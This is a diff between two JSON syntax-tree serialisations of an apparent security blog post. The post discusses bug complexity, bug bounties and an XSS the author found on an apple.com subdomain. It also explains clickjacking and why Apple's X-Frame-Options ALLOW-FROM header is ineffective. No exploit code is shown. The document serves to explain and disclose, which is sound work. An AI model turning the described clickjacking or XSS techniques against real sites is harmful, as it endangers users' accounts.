>                   "value": "The more complicated a security bug is, the less likely it is to be discovered,\nbut also the more likely it is to be really dangerous if found. There's\nliterally hundreds if not thousands of extremely high complexity security\nvulnerabilities in any system, software or otherwise. But the reason that all\nour shit doesn't fall apart is because high complexity means ",
>                   "position": {
>                     "start": {
>                       "line": 104,
>                       "column": 1,
>                       "offset": 4878
>                     },
>                     "end": {
>                       "line": 108,
>                       "column": 62,
>                       "offset": 5247
>                     },
>                     "indent": [
>                       1,
>                       1,
>                       1,
>                       1
>                     ]
>                   }
>                 },
>                 {
>                   "type": "emphasis",
>                   "children": [
>                     {
>                       "type": "text",
>                       "value": "difficult to\nfind",
>                       "position": {
>                         "start": {
>                           "line": 108,
>                           "column": 63,
>                           "offset": 5248
>                         },
>                         "end": {
>                           "line": 109,
>                           "column": 5,
>                           "offset": 5266
>                         },
>                         "indent": [
>                           1
>                         ]
>                       }
>                     }
>                   ],
>                   "position": {
>                     "start": {
>                       "line": 108,
>                       "column": 62,
>                       "offset": 5247
>                     },
>                     "end": {
>                       "line": 109,
>                       "column": 6,
>                       "offset": 5267
>                     },
>                     "indent": [
>                       1
>                     ]
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": ".",
>                   "position": {
>                     "start": {
>                       "line": 109,
>                       "column": 6,
>                       "offset": 5267
>                     },
>                     "end": {
>                       "line": 109,
>                       "column": 7,
>                       "offset": 5268
>                     },
>                     "indent": []
>                   }
>                 }
>               ],
>               "position": {
>                 "start": {
>                   "line": 104,
>                   "column": 1,
>                   "offset": 4878
>                 },
>                 "end": {
>                   "line": 109,
>                   "column": 7,
>                   "offset": 5268
>                 },
>                 "indent": [
>                   1,
>                   1,
>                   1,
>                   1,
>                   1
>                 ]
>               }
2725,2761c1167,1206
<             "indent": [
<               1,
<               1,
<               1
<             ]
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 190,
<           "column": 1,
<           "offset": 9794
<         },
<         "end": {
<           "line": 193,
<           "column": 23,
<           "offset": 10049
<         },
<         "indent": [
<           1,
<           1,
<           1
<         ]
<       }
<     },
<     {
<       "type": "paragraph",
<       "children": [
<         {
<           "type": "text",
<           "value": "If I want to share the legendary ",
<           "position": {
<             "start": {
<               "line": 195,
<               "column": 1,
<               "offset": 10053
---
>             {
>               "type": "paragraph",
>               "children": [
>                 {
>                   "type": "text",
>                   "value": "This puts the bugs I find in a fairly uncomfortable place. Sure, the bugs are\nreally impactful, and really bad on the surface but the fact that they exist\ndoesn't necessarily indicate a severe flaw in the underlying security system.",
>                   "position": {
>                     "start": {
>                       "line": 111,
>                       "column": 1,
>                       "offset": 5272
>                     },
>                     "end": {
>                       "line": 113,
>                       "column": 78,
>                       "offset": 5506
>                     },
>                     "indent": [
>                       1,
>                       1
>                     ]
>                   }
>                 }
>               ],
>               "position": {
>                 "start": {
>                   "line": 111,
>                   "column": 1,
>                   "offset": 5272
>                 },
>                 "end": {
>                   "line": 113,
>                   "column": 78,
>                   "offset": 5506
>                 },
>                 "indent": [
>                   1,
>                   1
>                 ]
>               }
2763,2766c1208,1249
<             "end": {
<               "line": 195,
<               "column": 34,
<               "offset": 10086
---
>             {
>               "type": "paragraph",
>               "children": [
>                 {
>                   "type": "text",
>                   "value": "That doesn't mean the bugs weren't worth finding either -- really complicated\nbugs are the kind that might one day absolutely ruin you if put in the hands of\nsome wealthy organized crime syndicate that bought it at auction or an\nauthoritarian state actor you've crossed.",
>                   "position": {
>                     "start": {
>                       "line": 115,
>                       "column": 1,
>                       "offset": 5510
>                     },
>                     "end": {
>                       "line": 118,
>                       "column": 42,
>                       "offset": 5783
>                     },
>                     "indent": [
>                       1,
>                       1,
>                       1
>                     ]
>                   }
>                 }
>               ],
>               "position": {
>                 "start": {
>                   "line": 115,
>                   "column": 1,
>                   "offset": 5510
>                 },
>                 "end": {
>                   "line": 118,
>                   "column": 42,
>                   "offset": 5783
>                 },
>                 "indent": [
>                   1,
>                   1,
>                   1
>                 ]
>               }
2768,2776d1250
<             "indent": []
<           }
<         },
<         {
<           "type": "linkReference",
<           "identifier": "3",
<           "label": "3",
<           "referenceType": "full",
<           "children": [
2778,2779c1252,1275
<               "type": "text",
<               "value": "SM64 - Watch for Rolling Rocks - 0.5x A\nPresses (Commentated)",
---
>               "type": "paragraph",
>               "children": [
>                 {
>                   "type": "text",
>                   "value": "My heavily laboured point is that it's important to differentiate security\nissues that need to get written by someone who is likely already an industry\nprofessional versus bugs that can be dug up by anyone pasting from the 'XSS\nEvasion Cheat Sheet'.",
>                   "position": {
>                     "start": {
>                       "line": 120,
>                       "column": 1,
>                       "offset": 5787
>                     },
>                     "end": {
>                       "line": 123,
>                       "column": 22,
>                       "offset": 6039
>                     },
>                     "indent": [
>                       1,
>                       1,
>                       1
>                     ]
>                   }
>                 }
>               ],
2782,2784c1278,1280
<                   "line": 195,
<                   "column": 35,
<                   "offset": 10087
---
>                   "line": 120,
>                   "column": 1,
>                   "offset": 5787
2787c1283
<                   "line": 196,
---
>                   "line": 123,
2789c1285
<                   "offset": 10149
---
>                   "offset": 6039
2791a1288,1289
>                   1,
>                   1,
2795,2825d1292
<             }
<           ],
<           "position": {
<             "start": {
<               "line": 195,
<               "column": 34,
<               "offset": 10086
<             },
<             "end": {
<               "line": 196,
<               "column": 26,
<               "offset": 10153
<             },
<             "indent": [
<               1
<             ]
<           }
<         },
<         {
<           "type": "text",
<           "value": " video from YouTube I might want to put in a video\nplayer. and (thank the gods) the 'share' button ",
<           "position": {
<             "start": {
<               "line": 196,
<               "column": 26,
<               "offset": 10153
<             },
<             "end": {
<               "line": 197,
<               "column": 49,
<               "offset": 10253
2827,2834d1293
<             "indent": [
<               1
<             ]
<           }
<         },
<         {
<           "type": "emphasis",
<           "children": [
2836,2837c1295,1426
<               "type": "text",
<               "value": "still",
---
>               "type": "paragraph",
>               "children": [
>                 {
>                   "type": "text",
>                   "value": "The former is much scarier ",
>                   "position": {
>                     "start": {
>                       "line": 125,
>                       "column": 1,
>                       "offset": 6043
>                     },
>                     "end": {
>                       "line": 125,
>                       "column": 28,
>                       "offset": 6070
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "emphasis",
>                   "children": [
>                     {
>                       "type": "text",
>                       "value": "when found",
>                       "position": {
>                         "start": {
>                           "line": 125,
>                           "column": 29,
>                           "offset": 6071
>                         },
>                         "end": {
>                           "line": 125,
>                           "column": 39,
>                           "offset": 6081
>                         },
>                         "indent": []
>                       }
>                     }
>                   ],
>                   "position": {
>                     "start": {
>                       "line": 125,
>                       "column": 28,
>                       "offset": 6070
>                     },
>                     "end": {
>                       "line": 125,
>                       "column": 40,
>                       "offset": 6082
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " than the latter, but the latter is much\nscarier in general because it's far, far more likely to happen in a malicious\ncontext. ",
>                   "position": {
>                     "start": {
>                       "line": 125,
>                       "column": 40,
>                       "offset": 6082
>                     },
>                     "end": {
>                       "line": 127,
>                       "column": 10,
>                       "offset": 6212
>                     },
>                     "indent": [
>                       1,
>                       1
>                     ]
>                   }
>                 },
>                 {
>                   "type": "emphasis",
>                   "children": [
>                     {
>                       "type": "text",
>                       "value": "HeartBleed",
>                       "position": {
>                         "start": {
>                           "line": 127,
>                           "column": 11,
>                           "offset": 6213
>                         },
>                         "end": {
>                           "line": 127,
>                           "column": 21,
>                           "offset": 6223
>                         },
>                         "indent": []
>                       }
>                     }
>                   ],
>                   "position": {
>                     "start": {
>                       "line": 127,
>                       "column": 10,
>                       "offset": 6212
>                     },
>                     "end": {
>                       "line": 127,
>                       "column": 22,
>                       "offset": 6224
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " is a terrifying bug. But bug categories need to be worried\nabout versus their likelihood of happening. If we drop the whole security budget\non preventing the next HeartBleed by porting all our systems to SELinux, a 16\nyear old HackForums reader named 'm4rshv1perX' is going to XSS our admins and\ndump our SQL database online.",
>                   "position": {
>                     "start": {
>                       "line": 127,
>                       "column": 22,
>                       "offset": 6224
>                     },
>                     "end": {
>                       "line": 131,
>                       "column": 30,
>                       "offset": 6554
>                     },
>                     "indent": [
>                       1,
>                       1,
>                       1,
>                       1
>                     ]
>                   }
>                 }
>               ],
2840,2842c1429,1431
<                   "line": 197,
<                   "column": 50,
<                   "offset": 10254
---
>                   "line": 125,
>                   "column": 1,
>                   "offset": 6043
2845,2847c1434,1436
<                   "line": 197,
<                   "column": 55,
<                   "offset": 10259
---
>                   "line": 131,
>                   "column": 30,
>                   "offset": 6554
2849c1438,1445
<                 "indent": []
---
>                 "indent": [
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1
>                 ]
2851,2962d1446
<             }
<           ],
<           "position": {
<             "start": {
<               "line": 197,
<               "column": 49,
<               "offset": 10253
<             },
<             "end": {
<               "line": 197,
<               "column": 56,
<               "offset": 10260
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " has an 'embed' option\nwith some HTML code after 10 years or however long YouTube has been around for.",
<           "position": {
<             "start": {
<               "line": 197,
<               "column": 56,
<               "offset": 10260
<             },
<             "end": {
<               "line": 198,
<               "column": 80,
<               "offset": 10363
<             },
<             "indent": [
<               1
<             ]
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 195,
<           "column": 1,
<           "offset": 10053
<         },
<         "end": {
<           "line": 198,
<           "column": 80,
<           "offset": 10363
<         },
<         "indent": [
<           1,
<           1,
<           1
<         ]
<       }
<     },
<     {
<       "type": "definition",
<       "identifier": "3",
<       "label": "3",
<       "title": null,
<       "url": "https://www.youtube.com/watch?v=kpk2tdsPh0A",
<       "position": {
<         "start": {
<           "line": 200,
<           "column": 1,
<           "offset": 10367
<         },
<         "end": {
<           "line": 200,
<           "column": 49,
<           "offset": 10415
<         },
<         "indent": []
<       }
<     },
<     {
<       "type": "code",
<       "lang": "HTML",
<       "meta": null,
<       "value": "\n<iframe width=\"560\" height=\"315\"\nsrc=\"https://www.youtube.com/embed/kpk2tdsPh0A\" frameborder=\"0\"\nallow=\"accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture\"\nallowfullscreen></iframe>\n",
<       "position": {
<         "start": {
<           "line": 202,
<           "column": 1,
<           "offset": 10419
<         },
<         "end": {
<           "line": 209,
<           "column": 4,
<           "offset": 10642
<         },
<         "indent": [
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1
<         ]
<       }
<     },
<     {
<       "type": "paragraph",
<       "children": [
<         {
<           "type": "text",
<           "value": "The iframe is a classic great web idea that has survived the ages. I indicate to\nyour web browser in my web page with some HTML that I want ",
<           "position": {
<             "start": {
<               "line": 211,
<               "column": 1,
<               "offset": 10646
2964,2976d1447
<             "end": {
<               "line": 212,
<               "column": 60,
<               "offset": 10787
<             },
<             "indent": [
<               1
<             ]
<           }
<         },
<         {
<           "type": "emphasis",
<           "children": [
2978,2979c1449,1473
<               "type": "text",
<               "value": "another",
---
>               "type": "paragraph",
>               "children": [
>                 {
>                   "type": "text",
>                   "value": "Though bug bounties are currently fodder for 10,000 medium severity issues on\nstaging.john.production.com this is what I always saw bug bounties and\nvulnerability disclosure as perfect for: scooping up the vulnerabilities\nproduced by people who just happen to have some special research that breaches\nthat area of high complication.",
>                   "position": {
>                     "start": {
>                       "line": 133,
>                       "column": 1,
>                       "offset": 6558
>                     },
>                     "end": {
>                       "line": 137,
>                       "column": 32,
>                       "offset": 6894
>                     },
>                     "indent": [
>                       1,
>                       1,
>                       1,
>                       1
>                     ]
>                   }
>                 }
>               ],
2982,2984c1476,1478
<                   "line": 212,
<                   "column": 61,
<                   "offset": 10788
---
>                   "line": 133,
>                   "column": 1,
>                   "offset": 6558
2987,2989c1481,1483
<                   "line": 212,
<                   "column": 68,
<                   "offset": 10795
---
>                   "line": 137,
>                   "column": 32,
>                   "offset": 6894
2991c1485,1490
<                 "indent": []
---
>                 "indent": [
>                   1,
>                   1,
>                   1,
>                   1
>                 ]
2993,3061d1491
<             }
<           ],
<           "position": {
<             "start": {
<               "line": 212,
<               "column": 60,
<               "offset": 10787
<             },
<             "end": {
<               "line": 212,
<               "column": 69,
<               "offset": 10796
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " webpage to\nbe included in my webpage. In this case, a YouTube video.",
<           "position": {
<             "start": {
<               "line": 212,
<               "column": 69,
<               "offset": 10796
<             },
<             "end": {
<               "line": 213,
<               "column": 58,
<               "offset": 10866
<             },
<             "indent": [
<               1
<             ]
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 211,
<           "column": 1,
<           "offset": 10646
<         },
<         "end": {
<           "line": 213,
<           "column": 58,
<           "offset": 10866
<         },
<         "indent": [
<           1,
<           1
<         ]
<       }
<     },
<     {
<       "type": "paragraph",
<       "children": [
<         {
<           "type": "text",
<           "value": "But I put this to you: if I could just embed ",
<           "position": {
<             "start": {
<               "line": 215,
<               "column": 1,
<               "offset": 10870
<             },
<             "end": {
<               "line": 215,
<               "column": 46,
<               "offset": 10915
3063,3068d1492
<             "indent": []
<           }
<         },
<         {
<           "type": "emphasis",
<           "children": [
3070,3071c1494,1516
<               "type": "text",
<               "value": "anything",
---
>               "type": "paragraph",
>               "children": [
>                 {
>                   "type": "text",
>                   "value": "Just a few minutes attention from some Project Zero guys is worth tens of\nthousands of dollars if I could only tempt them with my fine selection of bounty\nshirts and glass tumblers with company logos.",
>                   "position": {
>                     "start": {
>                       "line": 139,
>                       "column": 1,
>                       "offset": 6898
>                     },
>                     "end": {
>                       "line": 141,
>                       "column": 46,
>                       "offset": 7100
>                     },
>                     "indent": [
>                       1,
>                       1
>                     ]
>                   }
>                 }
>               ],
3074,3076c1519,1521
<                   "line": 215,
<                   "column": 47,
<                   "offset": 10916
---
>                   "line": 139,
>                   "column": 1,
>                   "offset": 6898
3079,3081c1524,1526
<                   "line": 215,
<                   "column": 55,
<                   "offset": 10924
---
>                   "line": 141,
>                   "column": 46,
>                   "offset": 7100
3083c1528,1531
<                 "indent": []
---
>                 "indent": [
>                   1,
>                   1
>                 ]
3087,3268c1535,1536
<           "position": {
<             "start": {
<               "line": 215,
<               "column": 46,
<               "offset": 10915
<             },
<             "end": {
<               "line": 215,
<               "column": 56,
<               "offset": 10925
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " on my website, we'd be\nhaving a bad time. If I could just tell your web browser to embed your bank on\nmy page, I could just stick a bunch of stuff over the top and, I don't know make\nyou click a button you can't see that actually donates a bunch of money to my\nman, YouTuber pannenkoek2012.",
<           "position": {
<             "start": {
<               "line": 215,
<               "column": 56,
<               "offset": 10925
<             },
<             "end": {
<               "line": 219,
<               "column": 30,
<               "offset": 11220
<             },
<             "indent": [
<               1,
<               1,
<               1,
<               1
<             ]
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 215,
<           "column": 1,
<           "offset": 10870
<         },
<         "end": {
<           "line": 219,
<           "column": 30,
<           "offset": 11220
<         },
<         "indent": [
<           1,
<           1,
<           1,
<           1
<         ]
<       }
<     },
<     {
<       "type": "paragraph",
<       "children": [
<         {
<           "type": "text",
<           "value": "The first way browsers started to deal with this 'Clickjacking' problem is the\n",
<           "position": {
<             "start": {
<               "line": 221,
<               "column": 1,
<               "offset": 11224
<             },
<             "end": {
<               "line": 222,
<               "column": 1,
<               "offset": 11304
<             },
<             "indent": [
<               1
<             ]
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "X-Frame-Options",
<           "position": {
<             "start": {
<               "line": 222,
<               "column": 1,
<               "offset": 11304
<             },
<             "end": {
<               "line": 222,
<               "column": 18,
<               "offset": 11321
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " header. It has two possible values: ",
<           "position": {
<             "start": {
<               "line": 222,
<               "column": 18,
<               "offset": 11321
<             },
<             "end": {
<               "line": 222,
<               "column": 55,
<               "offset": 11358
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "DENY",
<           "position": {
<             "start": {
<               "line": 222,
<               "column": 55,
<               "offset": 11358
<             },
<             "end": {
<               "line": 222,
<               "column": 61,
<               "offset": 11364
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": ", which prevents the\npage from ever being embedded, or ",
<           "position": {
<             "start": {
<               "line": 222,
<               "column": 61,
<               "offset": 11364
<             },
<             "end": {
<               "line": 223,
<               "column": 35,
<               "offset": 11420
<             },
<             "indent": [
<               1
<             ]
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "sameorigin",
<           "position": {
<             "start": {
<               "line": 223,
<               "column": 35,
<               "offset": 11420
<             },
<             "end": {
<               "line": 223,
<               "column": 47,
<               "offset": 11432
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": ", which only allows it to embed\nitself. If you are developing a website you should ",
<           "position": {
<             "start": {
<               "line": 223,
<               "column": 47,
<               "offset": 11432
<             },
<             "end": {
<               "line": 224,
<               "column": 52,
<               "offset": 11516
<             },
<             "indent": [
<               1
<             ]
---
>           "data": {
>             "hName": "section"
3272c1540,1541
<           "type": "emphasis",
---
>           "type": "section",
>           "depth": 2,
3275,3276c1544,1564
<               "type": "text",
<               "value": "always",
---
>               "type": "heading",
>               "depth": 2,
>               "children": [
>                 {
>                   "type": "text",
>                   "value": "II. The Very Worst Thing {#the_very_worst_thing}",
>                   "position": {
>                     "start": {
>                       "line": 143,
>                       "column": 1,
>                       "offset": 7104
>                     },
>                     "end": {
>                       "line": 143,
>                       "column": 49,
>                       "offset": 7152
>                     },
>                     "indent": []
>                   }
>                 }
>               ],
3279,3281c1567,1569
<                   "line": 224,
<                   "column": 53,
<                   "offset": 11517
---
>                   "line": 143,
>                   "column": 1,
>                   "offset": 7104
3284,3286c1572,1574
<                   "line": 224,
<                   "column": 59,
<                   "offset": 11523
---
>                   "line": 144,
>                   "column": 45,
>                   "offset": 7198
3288c1576,1578
<                 "indent": []
---
>                 "indent": [
>                   1
>                 ]
3290,3500d1579
<             }
<           ],
<           "position": {
<             "start": {
<               "line": 224,
<               "column": 52,
<               "offset": 11516
<             },
<             "end": {
<               "line": 224,
<               "column": 60,
<               "offset": 11524
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " set this to ",
<           "position": {
<             "start": {
<               "line": 224,
<               "column": 60,
<               "offset": 11524
<             },
<             "end": {
<               "line": 224,
<               "column": 73,
<               "offset": 11537
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "DENY",
<           "position": {
<             "start": {
<               "line": 224,
<               "column": 73,
<               "offset": 11537
<             },
<             "end": {
<               "line": 224,
<               "column": 79,
<               "offset": 11543
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": "\nunless you really know what you're doing.",
<           "position": {
<             "start": {
<               "line": 224,
<               "column": 79,
<               "offset": 11543
<             },
<             "end": {
<               "line": 225,
<               "column": 42,
<               "offset": 11586
<             },
<             "indent": [
<               1
<             ]
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 221,
<           "column": 1,
<           "offset": 11224
<         },
<         "end": {
<           "line": 225,
<           "column": 42,
<           "offset": 11586
<         },
<         "indent": [
<           1,
<           1,
<           1,
<           1
<         ]
<       }
<     },
<     {
<       "type": "paragraph",
<       "children": [
<         {
<           "type": "text",
<           "value": "I actually lied when I said ",
<           "position": {
<             "start": {
<               "line": 227,
<               "column": 1,
<               "offset": 11590
<             },
<             "end": {
<               "line": 227,
<               "column": 29,
<               "offset": 11618
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "X-Frame-Options",
<           "position": {
<             "start": {
<               "line": 227,
<               "column": 29,
<               "offset": 11618
<             },
<             "end": {
<               "line": 227,
<               "column": 46,
<               "offset": 11635
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " only has two possible values.\nThere's a third, ",
<           "position": {
<             "start": {
<               "line": 227,
<               "column": 46,
<               "offset": 11635
<             },
<             "end": {
<               "line": 228,
<               "column": 18,
<               "offset": 11684
<             },
<             "indent": [
<               1
<             ]
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "allow-from [domain]",
<           "position": {
<             "start": {
<               "line": 228,
<               "column": 18,
<               "offset": 11684
<             },
<             "end": {
<               "line": 228,
<               "column": 39,
<               "offset": 11705
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": ", which existed for a little while in a\nhandful of browsers. The idea was you'd set ",
<           "position": {
<             "start": {
<               "line": 228,
<               "column": 39,
<               "offset": 11705
<             },
<             "end": {
<               "line": 229,
<               "column": 45,
<               "offset": 11790
<             },
<             "indent": [
<               1
<             ]
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "allow-from mywebsite2.com",
<           "position": {
<             "start": {
<               "line": 229,
<               "column": 45,
<               "offset": 11790
<             },
<             "end": {
<               "line": 229,
<               "column": 72,
<               "offset": 11817
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " and then\n",
<           "position": {
<             "start": {
<               "line": 229,
<               "column": 72,
<               "offset": 11817
<             },
<             "end": {
<               "line": 230,
<               "column": 1,
<               "offset": 11828
3502,3509d1580
<             "indent": [
<               1
<             ]
<           }
<         },
<         {
<           "type": "emphasis",
<           "children": [
3511,3512c1582,1586
<               "type": "text",
<               "value": "just",
---
>               "type": "definition",
>               "identifier": "the very worst thing",
>               "label": "The Very Worst Thing",
>               "title": null,
>               "url": "#the_very_worst_thing",
3515,3517c1589,1591
<                   "line": 230,
<                   "column": 2,
<                   "offset": 11829
---
>                   "line": 146,
>                   "column": 1,
>                   "offset": 7202
3520,3522c1594,1596
<                   "line": 230,
<                   "column": 6,
<                   "offset": 11833
---
>                   "line": 146,
>                   "column": 46,
>                   "offset": 7247
3526,3554d1599
<             }
<           ],
<           "position": {
<             "start": {
<               "line": 230,
<               "column": 1,
<               "offset": 11828
<             },
<             "end": {
<               "line": 230,
<               "column": 7,
<               "offset": 11834
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " ",
<           "position": {
<             "start": {
<               "line": 230,
<               "column": 7,
<               "offset": 11834
<             },
<             "end": {
<               "line": 230,
<               "column": 8,
<               "offset": 11835
3556,3631d1600
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "mywebsite2.com",
<           "position": {
<             "start": {
<               "line": 230,
<               "column": 8,
<               "offset": 11835
<             },
<             "end": {
<               "line": 230,
<               "column": 24,
<               "offset": 11851
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " can embed your webpage. ",
<           "position": {
<             "start": {
<               "line": 230,
<               "column": 24,
<               "offset": 11851
<             },
<             "end": {
<               "line": 230,
<               "column": 49,
<               "offset": 11876
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "idmsa.apple.com",
<           "position": {
<             "start": {
<               "line": 230,
<               "column": 49,
<               "offset": 11876
<             },
<             "end": {
<               "line": 230,
<               "column": 66,
<               "offset": 11893
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " is actually\nthe ",
<           "position": {
<             "start": {
<               "line": 230,
<               "column": 66,
<               "offset": 11893
<             },
<             "end": {
<               "line": 231,
<               "column": 5,
<               "offset": 11911
<             },
<             "indent": [
<               1
<             ]
<           }
<         },
<         {
<           "type": "emphasis",
<           "children": [
3633,3634c1602,1606
<               "type": "text",
<               "value": "only",
---
>               "type": "definition",
>               "identifier": "§2",
>               "label": "§2",
>               "title": null,
>               "url": "#the_very_worst_thing",
3637,3639c1609,1611
<                   "line": 231,
<                   "column": 6,
<                   "offset": 11912
---
>                   "line": 148,
>                   "column": 1,
>                   "offset": 7251
3642,3644c1614,1616
<                   "line": 231,
<                   "column": 10,
<                   "offset": 11916
---
>                   "line": 148,
>                   "column": 28,
>                   "offset": 7278
3648,3676d1619
<             }
<           ],
<           "position": {
<             "start": {
<               "line": 231,
<               "column": 5,
<               "offset": 11911
<             },
<             "end": {
<               "line": 231,
<               "column": 11,
<               "offset": 11917
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " place I have ",
<           "position": {
<             "start": {
<               "line": 231,
<               "column": 11,
<               "offset": 11917
<             },
<             "end": {
<               "line": 231,
<               "column": 25,
<               "offset": 11931
3678,3683d1620
<             "indent": []
<           }
<         },
<         {
<           "type": "emphasis",
<           "children": [
3685,3686c1622,1648
<               "type": "text",
<               "value": "ever",
---
>               "type": "paragraph",
>               "children": [
>                 {
>                   "type": "text",
>                   "value": "A few days ago when I was sick with flu and researching Apple security to\ndistract me from the aches and pains of my failing mortal body I found an XSS\ndeep in an apple.com subdomain. That's to say, I could inject some code into a\nwebsite somewhere on apple.com, which, to a user's web browser looked like it\nwas written by Apple. In such cases, my code is granted all the privilages\nassociated with Being Code That Apple Wrote inside a web browser, such as being\nable to talk to Apple servers on the user's behalf.",
>                   "position": {
>                     "start": {
>                       "line": 150,
>                       "column": 1,
>                       "offset": 7282
>                     },
>                     "end": {
>                       "line": 156,
>                       "column": 52,
>                       "offset": 7803
>                     },
>                     "indent": [
>                       1,
>                       1,
>                       1,
>                       1,
>                       1,
>                       1
>                     ]
>                   }
>                 }
>               ],
3689,3691c1651,1653
<                   "line": 231,
<                   "column": 26,
<                   "offset": 11932
---
>                   "line": 150,
>                   "column": 1,
>                   "offset": 7282
3694,3696c1656,1658
<                   "line": 231,
<                   "column": 30,
<                   "offset": 11936
---
>                   "line": 156,
>                   "column": 52,
>                   "offset": 7803
3698c1660,1667
<                 "indent": []
---
>                 "indent": [
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1
>                 ]
3700,4898d1668
<             }
<           ],
<           "position": {
<             "start": {
<               "line": 231,
<               "column": 25,
<               "offset": 11931
<             },
<             "end": {
<               "line": 231,
<               "column": 31,
<               "offset": 11937
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " seen this header used. Apple sets it to:",
<           "position": {
<             "start": {
<               "line": 231,
<               "column": 31,
<               "offset": 11937
<             },
<             "end": {
<               "line": 231,
<               "column": 72,
<               "offset": 11978
<             },
<             "indent": []
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 227,
<           "column": 1,
<           "offset": 11590
<         },
<         "end": {
<           "line": 231,
<           "column": 72,
<           "offset": 11978
<         },
<         "indent": [
<           1,
<           1,
<           1,
<           1
<         ]
<       }
<     },
<     {
<       "type": "code",
<       "lang": null,
<       "meta": null,
<       "value": "HTTP X-FRAME-OPTIONS: ALLOW-FROM https://www.icloud.com",
<       "position": {
<         "start": {
<           "line": 233,
<           "column": 1,
<           "offset": 11982
<         },
<         "end": {
<           "line": 235,
<           "column": 4,
<           "offset": 12047
<         },
<         "indent": [
<           1,
<           1
<         ]
<       }
<     },
<     {
<       "type": "paragraph",
<       "children": [
<         {
<           "type": "text",
<           "value": "What does this do? Absolutely nothing in any mordern browser. It's not even\nequivalent to ",
<           "position": {
<             "start": {
<               "line": 237,
<               "column": 1,
<               "offset": 12051
<             },
<             "end": {
<               "line": 238,
<               "column": 15,
<               "offset": 12142
<             },
<             "indent": [
<               1
<             ]
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "DENY",
<           "position": {
<             "start": {
<               "line": 238,
<               "column": 15,
<               "offset": 12142
<             },
<             "end": {
<               "line": 238,
<               "column": 21,
<               "offset": 12148
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": ". it lets any website embed you.",
<           "position": {
<             "start": {
<               "line": 238,
<               "column": 21,
<               "offset": 12148
<             },
<             "end": {
<               "line": 238,
<               "column": 53,
<               "offset": 12180
<             },
<             "indent": []
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 237,
<           "column": 1,
<           "offset": 12051
<         },
<         "end": {
<           "line": 238,
<           "column": 53,
<           "offset": 12180
<         },
<         "indent": [
<           1
<         ]
<       }
<     },
<     {
<       "type": "paragraph",
<       "children": [
<         {
<           "type": "text",
<           "value": "This would be really bad, and I'd say uncharaceristically bad for Apple. Apple\nbacks the old-timey ",
<           "position": {
<             "start": {
<               "line": 240,
<               "column": 1,
<               "offset": 12184
<             },
<             "end": {
<               "line": 241,
<               "column": 21,
<               "offset": 12284
<             },
<             "indent": [
<               1
<             ]
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "X-Frame-Options: ALLOW-FROM",
<           "position": {
<             "start": {
<               "line": 241,
<               "column": 21,
<               "offset": 12284
<             },
<             "end": {
<               "line": 241,
<               "column": 50,
<               "offset": 12313
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " with the new hotness, Content\nSecurity Policy ",
<           "position": {
<             "start": {
<               "line": 241,
<               "column": 50,
<               "offset": 12313
<             },
<             "end": {
<               "line": 242,
<               "column": 17,
<               "offset": 12361
<             },
<             "indent": [
<               1
<             ]
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "frame-ancestors",
<           "position": {
<             "start": {
<               "line": 242,
<               "column": 17,
<               "offset": 12361
<             },
<             "end": {
<               "line": 242,
<               "column": 34,
<               "offset": 12378
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": ".",
<           "position": {
<             "start": {
<               "line": 242,
<               "column": 34,
<               "offset": 12378
<             },
<             "end": {
<               "line": 242,
<               "column": 35,
<               "offset": 12379
<             },
<             "indent": []
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 240,
<           "column": 1,
<           "offset": 12184
<         },
<         "end": {
<           "line": 242,
<           "column": 35,
<           "offset": 12379
<         },
<         "indent": [
<           1,
<           1
<         ]
<       }
<     },
<     {
<       "type": "paragraph",
<       "children": [
